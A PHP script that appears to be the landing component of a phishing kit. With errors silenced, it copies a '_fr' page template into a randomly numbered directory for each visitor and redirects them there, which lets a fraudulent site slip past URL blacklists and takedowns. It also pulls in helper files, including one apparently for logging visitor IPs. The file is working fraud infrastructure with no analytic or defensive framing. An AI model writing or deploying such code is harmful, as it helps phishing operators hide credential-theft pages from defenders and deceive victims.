<?php
error_reporting(0);
//--------------------------//
include('./assets/srv/funciones.php');
include('./assets/srv/app.php');
include 'get_ip.php';  
//--------------------------//
$random    = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$random1    = substr(md5($random), 0, 20);
$random2 = substr(md5($random), 0, 14);
$random3 = substr(md5($random), 0, 8);
$random4 = substr(md5($random), 0, 50);

for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 16; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./_fr".$DIR;
$DST10_="_fr";
function recurse_copy($DST10_,$DIR) {
$dir = opendir($DST10_);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($DST10_ . '/' . $file) ) {
recurse_copy($DST10_ . '/' . $file,$DIR . '/' . $file);
}
else {
copy($DST10_ . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $DST10_, $DIR );
#END
//LOCATION !
header("LOCATION: ".$DIR."");


?>